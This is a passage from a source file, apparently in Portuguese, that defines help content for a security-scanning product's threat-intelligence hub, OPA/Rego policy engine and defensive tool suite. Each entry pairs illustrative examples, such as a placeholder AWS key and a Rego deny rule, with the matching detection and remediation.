      systemDetection: `Achado atribuído ao estágio Pre-commit com política de bloqueio imediato (Fail on HIGH).`,
      outputRemediation: `Pipeline interrompe o commit no git hook pre-commit antes de alcançar o repositório remoto.`
    }
  },
  ctihub: {
    id: 'ctihub',
    name: 'Cyber Threat Intelligence (CTI) Hub',
    category: 'Defesa & Runtime',
    badge: 'OTX / CISA KEV',
    shortSummary: 'Hub de inteligência de ameaças cibernéticas com ingestão contínua de feeds públicos (AlienVault OTX, CISA KEV, MISP e AbuseIPDB). Correlaciona automaticamente achados do código-fonte a atores hostis conhecidos e IOCs ativos.',
    howItWorks: 'O motor CTI analisa as categorias, regras e snippets de achados locais (credenciais AWS, tokens JWT, conexões de banco de dados, injeções SQL e SSRF) e os mapeia para perfis de adversários ativos (Scattered Spider, Lazarus Group, Volt Typhoon, FIN7, LockBit 3.0 e TeamTNT). Aplica multiplicadores de risco baseados em exploração comprovada no mundo real (CISA KEV) e gera pacotes STIX 2.1 padronizados.',
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Threat Intel (CTI)"',
        description: 'Visualize o status dos feeds conectados (AlienVault OTX, CISA KEV, MISP CIRCL, AbuseIPDB) e a taxa de pulses em tempo real.'
      },
      {
        step: 2,
        action: 'Verificar Achados Correlacionados & Urgência',
        description: 'Examine as tags de atores de ameaça atribuídas aos seus arquivos locais, incluindo TTPs do MITRE ATT&CK e alertas de CISA KEV.'
      },
      {
        step: 3,
        action: 'Aplicar Tags aos Achados',
        description: 'Clique em "Aplicar Tags aos Achados" para enriquecer o relatório principal com multiplicadores de risco e metadados CTI.'
      },
      {
        step: 4,
        action: 'Consultar Indicadores ou Exportar STIX 2.1',
        description: 'Utilize o buscador rápido de IOCs para testar IPs/hashes ou exporte o bundle completo de inteligência para SIEM e OpenCTI.'
      }
    ],
    example: {
      title: 'Exemplo: Correlação de Chave AWS com Campanha Scattered Spider',
      scenario: 'Uma chave estática AKIA foi detectada em código de infraestrutura de nuvem.',
      inputSnippet: `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"`,
      systemDetection: `Correlacionado ao grupo Scattered Spider (UNC3944), pulse AlienVault OTX #9042 e técnica T1552.001 (Credentials in Files).`,
      outputRemediation: `Amplificador de risco de 1.75x aplicado e recomendação de revogação imediata via AWS IAM com rotação de segredo.`
    }
  },
  policyascode: {
    id: 'policyascode',
    name: 'Policy-as-Code Engine (OPA / Rego)',
    category: 'Conformidade & Governança',
    badge: 'OPA / Rego',
    shortSummary: 'Governança de segurança declarativa com Open Policy Agent (OPA) e linguagem Rego para verificação contínua de guardrails organizacionais contra PCI-DSS, SOC 2, NIST e regras personalizadas.',
    howItWorks: `O motor avalia o documento de entrada JSON gerado pela análise estática (achados, severidades, entropia, métricas de risco e endpoints de API) contra políticas declarativas escritas em Rego. Cada política avalia regras de 'deny' e 'allow', atribuindo níveis de enforcement (BLOCKING para quebra de build em CI/CD, WARNING para revisão ou ADVISORY para auditoria).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Acessar a aba "Policy-as-Code (OPA)"',
        description: 'Visualize o índice de conformidade OPA, status de aprovação de Quality Gate e políticas ativas.'
      },
      {
        step: 2,
        action: 'Ativar, Desativar ou Ajustar Nível de Enforcement',
        description: 'Controle quais políticas quebram pipelines selecionando BLOCKING, WARNING ou ADVISORY nos cards.'
      },
      {
        step: 3,
        action: 'Editar ou Criar Regras no Editor Rego com Sandbox',
        description: 'Utilize o Live IDE para escrever regras Rego, carregar templates prontos e testar em tempo real contra os achados do scan.'
      },
      {
        step: 4,
        action: 'Exportar Bundle .rego ou Executar no CI/CD',
        description: 'Exporte o pacote consolidado de políticas ou utilize o snippet fornecido para GitHub Actions e GitLab CI.'
      }
    ],
    example: {
      title: 'Exemplo: Guardrail Bloqueante contra Segredos em Produção',
      scenario: 'Uma política OPA impede commits que introduzam segredos estáticos ou credenciais em arquivos do repositório.',
      inputSnippet: `package secscan.pci_dss.req6_5\ndefault allow = false\ndeny[msg] {\n  some finding in input.findings\n  finding.severity == "CRITICAL"\n  msg := sprintf("PCI-DSS 4.0 Req 6.5 Violado: %v em %v", [finding.ruleName, finding.file])\n}\nallow { count(deny) == 0 }`,
      systemDetection: `Regra deny acionada: 2 achados críticos detectados, score de conformidade 75% e Quality Gate em estado FAILED_BLOCKING.`,
      outputRemediation: `Pipeline CI/CD bloqueado até que os segredos sejam removidos e rotacionados conforme a política corporativa.`
    }
  },
  procyber: {
    id: 'procyber',
    name: 'Pro Cyber Defense Suite (10 Ferramentas Pro)',
    category: 'Defesa & Runtime',
    badge: '10 PRO TOOLS',
    shortSummary: 'Cockpit enterprise integrando 10 capacidades avançadas de cibersegurança: SOAR Playbooks, BAS Purple Team, Sigma Rule Transpiler, Malware Sandbox, KMS Vault, SLSA Supply Chain, EASM OSINT, Dark Web Monitor, Multi-Cloud CSPM e PKI TLS Manager.',
    howItWorks: `Uma suíte unificada que orquestra resposta a incidentes automatizada, simula violações em tempo real mapeadas no MITRE ATT&CK, transpila detecções universais Sigma para 6 formatos de SIEM, detona artefatos suspeitos em sandbox e gerencia a cadeia de confiança criptográfica (KMS, Cosign, PKI).`,
    stepByStepGuide: [
      {
        step: 1,
        action: 'Selecionar uma das 10 Ferramentas no Hub Superior',
        description: 'Alterne rapidamente entre SOAR, BAS, Sigma, Sandbox, Vault, Supply Chain, EASM, Dark Web, CSPM ou PKI.'
      },
      {
        step: 2,
        action: 'Disparar Simulações ou Execuções Interativas',
        description: 'Clique em "Disparar Playbook" no SOAR, "Disparar Simulação BAS" para testar o MITRE ATT&CK, ou detone payloads no Malware Sandbox.'
      },
      {
        step: 3,
        action: 'Exportar Regras e Atestados Oficiais',
        description: 'Copie queries Splunk/Elastic/Sentinel do Sigma, atestados SLSA v1.0, comandos Cosign ou CSRs de certificados mTLS.'
      },
      {
        step: 4,
        action: 'Aplicar Remediações em Nuvem e Vault',
        description: 'Utilize os comandos CLI do CSPM (AWS/Azure/GCP) ou emita segredos efêmeros com TTL no cofre KMS.'
      }
    ],
    example: {
      title: 'Exemplo: Contenção Automática de Credencial Leaked com SOAR & BAS',
      scenario: 'Uma chave AWS vazada no código dispara playbook SOAR para revogação no IAM e validação de bloqueio no teste atômico BAS.',
      inputSnippet: `playbook.execute("Contenção de Credencial de Nuvem Vazada", target="AWS_IAM")`,
      systemDetection: `Gatilho validado: Credencial revogada em 42ms, ticket SEC-1049 criado no Jira e teste BAS T1552 validado como BLOCKED.`,
      outputRemediation: `Risco neutralizado proativamente antes que o invasor pudesse utilizar o token.`
    }
  }
};
